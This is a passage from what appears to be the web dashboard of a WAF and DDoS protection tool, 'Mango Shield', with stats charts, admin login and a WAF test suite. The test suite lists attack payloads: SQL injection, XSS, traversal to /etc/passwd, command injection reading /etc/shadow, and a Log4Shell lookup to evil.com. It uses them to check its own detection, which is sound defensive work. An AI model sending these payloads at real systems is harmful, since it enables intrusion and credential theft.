      <div class="terminal" id="eventFeed"><div class="term-line"><span class="term-ts">--:--:--</span><span class="term-msg">Initializing Mango Shield...</span></div></div>
    </div>
  </div>
</section>

<!-- ============== TEST SUITE ============== -->
<section class="page" id="page-tests">
  <div class="card mb-24">
    <div class="card-title">WAF Attack Simulation Suite</div>
    <p style="font-size:13px;color:var(--text-muted);margin-bottom:16px">Test Mango Shield WAF by simulating real attack patterns. All tests are safe and only validate detection accuracy.</p>
    <div class="attack-grid" id="attackGrid"></div>
  </div>
  <div class="card">
    <div class="card-title">Test Results</div>
    <div class="terminal" id="testResults"><div class="term-line"><span class="term-ts">--:--:--</span><span class="term-msg">Select a test to begin...</span></div></div>
  </div>
</section>
    </div>
    <div class="card">
      <div class="card-title">Protection Stack</div>
      <table class="kv-table">
        <tr><td>JA3 Fingerprinting</td><td>Enabled</td></tr>
        <tr><td>JA4 Fingerprinting</td><td>Enabled</td></tr>
        <tr><td>HTTP/2 Fingerprint</td><td>Enabled</td></tr>
        <tr><td>Bot Classifier</td><td>Active</td></tr>
        <tr><td>Behavior Analysis</td><td>Learning + Active</td></tr>
        <tr><td>GeoIP Filtering</td><td>Enabled</td></tr>
        <tr><td>Rate Limiter</td><td>30 rps / 60 burst</td></tr>
        <tr><td>Mesh P2P Cluster</td><td id="cfg_mesh">--</td></tr>
      </table>
    </div>
  </div>
</section>

</main>

<footer class="footer">Mango Shield v3.0 -- Enterprise L7 DDoS Protection and WAF Engine -- Built with Go and eBPF</footer>

<script>
// ======================== DATA STATE ========================
var homeRps = new Array(60).fill(0);
var latestRpsHistory = new Array(60).fill(0);
var cpuHist = new Array(60).fill(0);
var lastBlocked = 0, connected = false, retryDelay = 1000;
var prevRx = 0, prevTx = 0;
var secLogs = [], eventLogs = [], testLogs = [];

// ======================== ADMIN MODAL & AUTH ========================
window.toggleAdminModal = function() {
  var modal = document.getElementById('adminModal');
  if (modal) modal.classList.toggle('active');
};

window.submitAdminLogin = function(e) {
  e.preventDefault();
  var u = document.getElementById('adminUser').value;
  var p = document.getElementById('adminPass').value;
  var msgEl = document.getElementById('loginMsg');
  msgEl.style.display = 'none';

  fetch('/api/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: u, password: p })
  }).then(function(r) {
    return r.text().then(function(txt) {
      try {
        return JSON.parse(txt);
      } catch(err) {
        return { status: 'error', message: 'Server busy or response blocked. Please try again.' };
      }
    });
  }).then(function(d) {
    if (d.status === 'ok') {
      toast('Admin authentication successful! Session active.', 'ok');
      document.getElementById('adminBtn').className = 'admin-btn logged-in';
      document.getElementById('adminBtnText').textContent = 'Admin: ' + u;
      window.toggleAdminModal();
    } else {
      msgEl.textContent = d.message || 'Invalid credentials';
      msgEl.style.color = 'var(--red)';
      msgEl.style.display = 'block';
    }
  }).catch(function(err) {
    msgEl.textContent = 'Connection error: ' + err.message;
    msgEl.style.color = 'var(--red)';
    msgEl.style.display = 'block';
  });
};

// ======================== TAB NAVIGATION ========================
function switchTab(tabName) {
  if (!tabName) return;
  var tabs = document.getElementsByClassName('nav-tab');
  for (var i = 0; i < tabs.length; i++) {
    var dt = tabs[i].getAttribute('data-tab');
    if (dt === tabName) {
      tabs[i].className = 'nav-tab active';
    } else {
      tabs[i].className = 'nav-tab';
    }
  }

  var pages = document.getElementsByClassName('page');
  for (var j = 0; j < pages.length; j++) {
    if (pages[j].id === 'page-' + tabName) {
      pages[j].className = 'page active';
    } else {
      pages[j].className = 'page';
    }
  }

  setTimeout(function() {
    try {
      if (tabName === 'home') drawLineChart('homeChart', homeRps, 'rgb(6,182,212)', null, 'RPS');
      if (tabName === 'dashboard') drawLineChart('dashChart', latestRpsHistory.length ? latestRpsHistory : homeRps, 'rgb(6,182,212)', null, 'RPS');
      if (tabName === 'stats') drawLineChart('statsChart', latestRpsHistory.length ? latestRpsHistory : homeRps, 'rgb(16,185,129)', null, 'req');
      if (tabName === 'dstat') drawLineChart('cpuChart', cpuHist, 'rgb(6,182,212)', 100, '%');
    } catch(err) {
      console.error('Chart update error:', err);
    }
  }, 50);
  if (tabName === 'dashboard' || tabName === 'stats') {
    fetchStats();
    fetchSystemStats();
  }
}
window.switchTab = switchTab;

document.addEventListener('click', function(e) {
  var t = e.target ? e.target.closest('.nav-tab') : null;
  if (!t) return;
  if (e && e.preventDefault) e.preventDefault();
  var tabName = t.getAttribute('data-tab');
  if (tabName) window.switchTab(tabName);
});

// ======================== FORMATTERS ========================
function fmt(n) {
  if (n === 0 || n == null || isNaN(n) || n === undefined) return '0';
  if (n >= 1e9) return (n/1e9).toFixed(1).replace(/\.0$/, '') + 'B';
  if (n >= 1e6) return (n/1e6).toFixed(1).replace(/\.0$/, '') + 'M';
  if (n >= 1e3) return (n/1e3).toFixed(1).replace(/\.0$/, '') + 'K';
  return Math.round(n).toString();
}
function fmtBytes(b) {
  if (b >= 1e12) return (b/1e12).toFixed(2)+' TB';
  if (b >= 1e9) return (b/1e9).toFixed(2)+' GB';
  if (b >= 1e6) return (b/1e6).toFixed(1)+' MB';
  if (b >= 1e3) return (b/1e3).toFixed(0)+' KB';
  return b + ' B';
}
function fmtUptime(s) {
  var d = Math.floor(s/86400), h = Math.floor((s%86400)/3600), m = Math.floor((s%3600)/60);
  var parts = [];
  if (d > 0) parts.push(d+'d');
  if (h > 0) parts.push(h+'h');
  parts.push(m+'m');
  return parts.join(' ');
}
function ts() { return new Date().toLocaleTimeString(); }
function pctClass(v) { return v > 80 ? 'red' : v > 50 ? 'amber' : 'green'; }

// ======================== TOAST SYSTEM ========================
function toast(msg, type) {
  var el = document.createElement('div');
  el.className = 'toast t-' + (type || 'ok');
  el.textContent = msg;
  document.getElementById('toasts').appendChild(el);
  setTimeout(function() { el.remove(); }, 4000);
}

// ======================== TERMINAL LOGGING ========================
var eventLogs = [], secLogs = [], testLogs = [];
function addLog(arr, elId, msg, type, maxLines) {
  arr.unshift({ t: ts(), msg: msg, type: type || '' });
  if (arr.length > (maxLines || 30)) arr.pop();
  renderLogs(arr, elId);
}
function renderLogs(arr, elId) {
  var el = document.getElementById(elId);
  if (!el) return;
  el.innerHTML = arr.map(function(l) {
    return '<div class="term-line ' + l.type + '"><span class="term-ts">' + l.t + '<\/span><span class="term-msg">' + l.msg + '<\/span><\/div>';
  }).join('');
}

// ======================== CANVAS CHART ========================
function drawLineChart(canvasId, data, strokeColor, maxOverride, unit) {
  try {
    var c = document.getElementById(canvasId);
    if (!c) return;
    var p = c.parentElement;
    var pW = (p && p.clientWidth > 50) ? p.clientWidth : 800;
    var pH = (p && p.clientHeight > 50) ? p.clientHeight : 200;
    c.width = pW;
    c.height = pH;

    var ctx = c.getContext('2d');
    if (!ctx) return;
    ctx.clearRect(0, 0, pW, pH);

    if (!data || data.length === 0) {
      data = new Array(60).fill(0);
    }

    var paddingLeft = 60;
    var paddingBottom = 22;
    var paddingTop = 14;
    var paddingRight = 15;
    var drawW = Math.max(10, pW - paddingLeft - paddingRight);
    var drawH = Math.max(10, pH - paddingTop - paddingBottom);

    var maxVal = 0;
    for (var i = 0; i < data.length; i++) {
      var v = Number(data[i]);
      if (!isNaN(v) && isFinite(v) && v > maxVal) maxVal = v;
    }
    var maxY = maxOverride || (maxVal > 0 ? Math.ceil(maxVal * 1.25) : 10);
    if (!isFinite(maxY) || isNaN(maxY) || maxY < 5) maxY = 5;

    // Draw Grid Lines & Labels
    ctx.strokeStyle = 'rgba(51, 65, 85, 0.4)';
    ctx.lineWidth = 1;
    ctx.fillStyle = '#94a3b8';
    ctx.font = '10px "Fira Code", monospace';
    ctx.textAlign = 'right';
    ctx.textBaseline = 'middle';

    var gridSteps = 4;
    for (var g = 0; g <= gridSteps; g++) {
      var gVal = Math.round(maxY * g / gridSteps);
      var gY = paddingTop + drawH - (drawH * g / gridSteps);

      ctx.beginPath();
      ctx.moveTo(paddingLeft, gY);
      ctx.lineTo(pW - paddingRight, gY);
      ctx.stroke();

      ctx.fillText(fmt(gVal) + (unit ? ' ' + unit : ''), paddingLeft - 6, gY);
    }

    // Time Labels
    ctx.textAlign = 'center';
    var timeLabels = ['-60s', '-45s', '-30s', '-15s', 'now'];
    for (var t = 0; t < timeLabels.length; t++) {
      var tX = paddingLeft + (drawW * t / (timeLabels.length - 1));
      ctx.fillText(timeLabels[t], tX, pH - 4);
    }

    // Area Fill Gradient
    var grad = ctx.createLinearGradient(0, paddingTop, 0, paddingTop + drawH);
    grad.addColorStop(0, 'rgba(6, 182, 212, 0.25)');
    grad.addColorStop(1, 'rgba(6, 182, 212, 0.0)');
    ctx.fillStyle = grad;

    ctx.beginPath();
    ctx.moveTo(paddingLeft, paddingTop + drawH);
    for (var k = 0; k < data.length; k++) {
      var kX = paddingLeft + (k / (data.length - 1)) * drawW;
      var valK = Number(data[k]) || 0;
      var kY = paddingTop + drawH - (valK / maxY) * drawH;
      ctx.lineTo(kX, kY);
    }
    ctx.lineTo(paddingLeft + drawW, paddingTop + drawH);
    ctx.closePath();
    ctx.fill();

    // Line Stroke
    ctx.strokeStyle = strokeColor || '#06b6d4';
    ctx.lineWidth = 2;
    ctx.beginPath();
    for (var m = 0; m < data.length; m++) {
      var mX = paddingLeft + (m / (data.length - 1)) * drawW;
      var valM = Number(data[m]) || 0;
      var mY = paddingTop + drawH - (valM / maxY) * drawH;
      if (m === 0) ctx.moveTo(mX, mY);
      else ctx.lineTo(mX, mY);
    }
    ctx.stroke();

    // Dot at current value
    var lastVal = Number(data[data.length - 1]) || 0;
    var lastX = paddingLeft + drawW;
    var lastY = paddingTop + drawH - (lastVal / maxY) * drawH;
    ctx.fillStyle = strokeColor || '#06b6d4';
    ctx.beginPath();
    ctx.arc(lastX, lastY, 4, 0, Math.PI * 2);
    ctx.fill();

  } catch(e) {
    console.error("drawLineChart error:", e);
  }
}

// ======================== FETCH STATS ========================
function fetchStats() {
  fetch('/api/stats?_=' + Date.now()).then(function(r) { return r.json(); }).then(function(d) {
    connected = true; retryDelay = 1000;
    document.getElementById('connDot').className = 'conn-dot on';
    document.getElementById('connText').textContent = 'Connected';

    // Home stats
    var rps = d.current_rps || 0;
    homeRps.push(rps); if (homeRps.length > 60) homeRps.shift();
    var ids = {h_rps: rps, h_total: d.total_requests, h_blocked: d.blocked_requests, h_passed: d.passed_requests, h_peak: d.peak_rps, h_bans: d.active_bans || d.banned_ips || 0};
    for (var k in ids) { var el = document.getElementById(k); if (el) el.textContent = fmt(ids[k]); }

    // Block rate
    var br = d.total_requests > 0 ? Math.round((d.blocked_requests / d.total_requests) * 100) : 0;
    setProgress('h_brate', 'h_bbar', br);
    var cl = Math.min(100, Math.round(((d.active_conns || 0) / 10000) * 100));
    setProgress('h_cload', 'h_cbar', cl);

    // Uptime
    var upEl = document.getElementById('h_uptime');
    if (upEl && d.uptime_seconds) upEl.textContent = fmtUptime(d.uptime_seconds);

    // Status
    var st = document.getElementById('navStatus');
    var stText = document.getElementById('navStatusText');
    if (d.is_under_attack) {
      st.className = 'nav-status atk';
      stText.textContent = 'UNDER ATTACK';
    } else {
      st.className = 'nav-status ok';
      stText.textContent = 'OPERATIONAL';
    }

    // Event log
    if (d.blocked_requests > lastBlocked + 3) {
      addLog(eventLogs, 'eventFeed', 'Blocked ' + (d.blocked_requests - lastBlocked) + ' threats', 'warn');
      addLog(secLogs, 'secLog', 'WAF mitigated ' + (d.blocked_requests - lastBlocked) + ' malicious requests', 'warn');
    }
    lastBlocked = d.blocked_requests;

    // Dashboard
    var dIds = {d_rps: rps, d_total: d.total_requests, d_blocked: d.blocked_requests, d_passed: d.passed_requests, d_peak: d.peak_rps, d_conns: d.active_conns, d_bans: d.active_bans || d.banned_ips || 0, d_xdp: d.xdp_dropped_pkts || 0};
    for (var k in dIds) { var el = document.getElementById(k); if (el) el.textContent = fmt(dIds[k]); }

    setProgress('d_brate', 'd_bbar', br);
    setProgress('d_cload', 'd_cbar', cl);

    // Cache ratio
    var cacheTotal = (d.cache_hits || 0) + (d.cache_misses || 0);
    var cacheRatio = cacheTotal > 0 ? Math.round(d.cache_hits / cacheTotal * 100) : 0;
    setProgress('d_cache', 'd_cachebar', cacheRatio);

    // Mesh
    var meshEl = document.getElementById('d_mesh');
    if (meshEl) {
      if (d.mesh_members && d.mesh_members.length > 0) {
        meshEl.innerHTML = d.mesh_members.map(function(m) {
          return '<div style="padding:8px 0;border-bottom:1px solid rgba(51,65,85,0.3);display:flex;justify-content:space-between"><span style="font-weight:600;font-size:13px">' + m.name + '</span><span style="font-family:var(--mono);font-size:11px;color:var(--text-muted)">' + m.addr + '</span></div>';
        }).join('');
      } else {
        meshEl.textContent = (d.mesh_nodes || 0) + ' node(s) - Single edge mode';
      }
    }

    // Statistics
    var passedPct = d.total_requests > 0 ? Math.round(d.passed_requests / d.total_requests * 100) : 0;
    setProgress('s_passed_pct', 's_passed_bar', passedPct);
    setProgress('s_blocked_pct', 's_blocked_bar', br);
    setText('s_block_rate', br + '%');
    setText('s_avg_rps', fmt(rps));
    setText('s_peak', fmt(d.peak_rps));
    setText('s_total', fmt(d.total_requests));
    setText('s_xdp', fmt(d.xdp_dropped_pkts || 0));
    setText('s_bans', fmt(d.active_bans || d.banned_ips || 0));
    setText('s_cache_hits', fmt(d.cache_hits || 0));
    setText('s_cache_miss', fmt(d.cache_misses || 0));

    // Cache tab
    setText('c_hits', fmt(d.cache_hits || 0));
    setText('c_miss', fmt(d.cache_misses || 0));
    setText('c_bypass', fmt(d.cache_bypasses || 0));
    setText('c_ratio', cacheRatio + '%');

    // Settings
    setText('cfg_mode', d.mode || 'auto');
    setText('cfg_xdp', d.xdp_enabled ? 'Active (sys_bpf)' : 'Disabled');
    if (d.mesh_enabled || d.mesh_nodes > 0) {
        setText('cfg_mesh', 'Active (' + (d.mesh_nodes || 0) + ' nodes)');
    } else {
        setText('cfg_mesh', 'Disabled');
    }

    // Charts
    drawLineChart('homeChart', homeRps, 'rgb(6,182,212)', null, 'RPS');
    if (d && d.hist_passed && d.hist_passed.length > 0) {
      drawLineChart('statsChart', d.hist_passed, 'rgb(16,185,129)', null, 'req');
    } else {
      drawLineChart('statsChart', homeRps, 'rgb(16,185,129)', null, 'req');
    }

  }).catch(function() {
    connected = false;
    document.getElementById('connDot').className = 'conn-dot off';
    document.getElementById('connText').textContent = 'Disconnected';
    retryDelay = Math.min(retryDelay * 1.5, 10000);
  });

  // RPS history for dashboard chart
  fetch('/api/rps-history?_=' + Date.now()).then(function(r) { return r.json(); }).then(function(d) {
    if (d && d.rps) {
      latestRpsHistory = d.rps;
      drawLineChart('dashChart', latestRpsHistory, 'rgb(6,182,212)', null, 'RPS');
      drawLineChart('statsChart', latestRpsHistory, 'rgb(16,185,129)', null, 'req');
    }
  }).catch(function(){});
}

// ======================== FETCH SYSTEM STATS (DSTAT) ========================
function fetchSystemStats() {
  fetch('/api/system-stats?_=' + Date.now()).then(function(r) { return r.json(); }).then(function(d) {
    if (d.error) return;

    var cpuPct = Math.round(d.cpu_percent || 0);
    cpuHist.push(cpuPct); if (cpuHist.length > 60) cpuHist.shift();

    setText('sys_cpu', cpuPct + '%');
    setText('sys_cpus', d.num_cpu + ' cores');
    setProgress('sys_cpu_pct', 'sys_cpu_bar', cpuPct);

    var ramPct = d.ram_total_mb > 0 ? Math.round(d.ram_used_mb / d.ram_total_mb * 100) : 0;
    setText('sys_ram', ramPct + '%');
    setText('sys_ram_detail', d.ram_used_mb + ' / ' + d.ram_total_mb + ' MB');
    setProgress('sys_ram_pct', 'sys_ram_bar', ramPct);

    var diskPct = Math.round(d.disk_used_pct || 0);
    setText('sys_disk', diskPct + '%');
    setText('sys_disk_detail', (d.disk_used_gb||0).toFixed(1) + ' / ' + (d.disk_total_gb||0).toFixed(1) + ' GB');
    setProgress('sys_disk_pct2', 'sys_disk_bar', diskPct);

    setText('sys_load', (d.load_1m||0).toFixed(2));
    setText('sys_load_detail', (d.load_1m||0).toFixed(2) + ' / ' + (d.load_5m||0).toFixed(2) + ' / ' + (d.load_15m||0).toFixed(2));

    // Network delta calculation
    var rxDelta = prevRx > 0 ? d.net_rx_bytes - prevRx : 0;
    var txDelta = prevTx > 0 ? d.net_tx_bytes - prevTx : 0;
    prevRx = d.net_rx_bytes;
    prevTx = d.net_tx_bytes;

    setText('sys_rx', fmtBytes(d.net_rx_bytes || 0));
    setText('sys_tx', fmtBytes(d.net_tx_bytes || 0));
    setText('sys_tcp', fmt(d.tcp_connections || 0));
    setText('sys_goroutines', fmt(d.goroutines || 0));

    if (d.uptime_seconds) {
      setText('sys_uptime_fmt', fmtUptime(d.uptime_seconds));
    }

    // CPU sparkline
    drawLineChart('cpuChart', cpuHist, 'rgb(6,182,212)', 100, '%');

  }).catch(function(){});
}

// ======================== HELPERS ========================
function setText(id, val) { var el = document.getElementById(id); if (el) el.textContent = val; }
function setProgress(labelId, barId, pct) {
  pct = Math.max(0, Math.min(100, pct));
  setText(labelId, pct + '%');
  var bar = document.getElementById(barId);
  if (bar) {
    bar.style.width = pct + '%';
    bar.className = 'prog-bar ' + pctClass(pct);
  }
}

// ======================== ATTACK SIMULATION ========================
var attacks = [
  { name: 'SQL Injection', desc: 'OWASP A03 - Injection attack via query parameter', path: "/search?q=' OR 1=1--", danger: true },
  { name: 'XSS Reflected', desc: 'OWASP A07 - Cross-site scripting via input field', path: '/search?q=<script>alert(1)<\/script>', danger: true },
  { name: 'Path Traversal', desc: 'OWASP A01 - Broken access via directory traversal', path: '/../../etc/passwd', danger: true },
  { name: 'Command Injection', desc: 'OS command injection via parameter', path: '/api?cmd=;cat /etc/shadow', danger: true },
  { name: 'Log4Shell (CVE-2021-44228)', desc: 'JNDI lookup injection attempt', path: '/search?q=${jndi:ldap://evil.com/a}', danger: true },
  { name: 'HTTP Smuggling', desc: 'Transfer-Encoding desync attempt', path: '/smuggle', danger: true },
  { name: 'Normal GET Request', desc: 'Legitimate traffic - should pass WAF cleanly', path: '/', danger: false },
  { name: 'Health Check', desc: 'API health probe - standard monitoring', path: '/api/dstat', danger: false },
];

function initAttackGrid() {
  var grid = document.getElementById('attackGrid');
  if (!grid) return;
  grid.innerHTML = attacks.map(function(a, i) {
    return '<div class="atk-item"><div class="atk-info"><div class="atk-name">' + a.name + '</div><div class="atk-desc">' + a.desc + '</div></div>' +
      '<button class="atk-btn ' + (a.danger ? '' : 'safe') + '" onclick="runTest(' + i + ')">' + (a.danger ? 'Attack' : 'Test') + '</button></div>';
  }).join('');
}

window.runTest = function(idx) {
  var a = attacks[idx];
  addLog(testLogs, 'testResults', 'Sending: ' + a.name + ' -> ' + a.path, '');
  fetch(a.path, { redirect: 'manual' }).then(function(r) {
    var status = r.status;
    if (a.danger) {
      if (status === 403 || status === 429 || status >= 400) {
        addLog(testLogs, 'testResults', 'BLOCKED [' + status + '] - WAF correctly detected ' + a.name, 'warn');
        toast('WAF blocked: ' + a.name, 'ok');
      } else {
        addLog(testLogs, 'testResults', 'PASSED [' + status + '] - WARNING: Attack not detected!', 'err');
        toast('Warning: ' + a.name + ' not blocked', 'err');
      }
    } else {
      if (status === 200) {
        addLog(testLogs, 'testResults', 'OK [200] - ' + a.name + ' passed successfully', '');
        toast(a.name + ' passed', 'ok');
      } else {
        addLog(testLogs, 'testResults', 'UNEXPECTED [' + status + '] - ' + a.name, 'warn');
      }
    }
  }).catch(function(err) {
    addLog(testLogs, 'testResults', 'ERROR - Network failure for ' + a.name + ': ' + err.message, 'err');
  });
};

// ======================== INIT ========================
initAttackGrid();
addLog(secLogs, 'secLog', 'Security event log initialized', '');
addLog(eventLogs, 'eventFeed', 'Mango Shield monitoring active', '');
fetchStats();
fetchSystemStats();
setInterval(fetchStats, 1500);
setInterval(fetchSystemStats, 2000);

window.addEventListener('resize', function() {
  drawLineChart('homeChart', homeRps, 'rgb(6,182,212)', null, 'RPS');
  if (latestRpsHistory && latestRpsHistory.length) {
    drawLineChart('dashChart', latestRpsHistory, 'rgb(6,182,212)', null, 'RPS');
    drawLineChart('statsChart', latestRpsHistory, 'rgb(16,185,129)', null, 'req');
  }
  drawLineChart('cpuChart', cpuHist, 'rgb(6,182,212)', 100, '%');
});
</script>
</body>
</html>`
